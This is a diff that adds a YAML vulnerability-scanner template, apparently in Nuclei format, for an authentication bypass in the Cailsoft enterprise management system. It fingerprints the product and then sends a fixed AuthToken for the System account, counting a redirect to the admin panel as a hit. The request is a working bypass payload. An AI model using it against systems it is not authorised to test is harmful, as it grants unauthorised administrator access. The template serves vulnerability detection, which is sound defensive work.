@@ -1,0 +1,43 @@
+id: cailsoft-authtoken-authentication-bypass
+info:
+  name: Cailsoft AuthToken Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: auth-bypass, management-system
+  description: |
+    This template identifies a vulnerability in the Cailsoft enterprise management system that allows authentication bypass via a crafted AuthToken.
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "赛蓝（广州）信息技术有限公司"
+
+  - raw:
+      - |
+        GET /AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "href=\"/Home6/AdminPretty\""
+      - type: word
+        part: header
+        words:
+          - "Location: /Home6/AdminPretty"
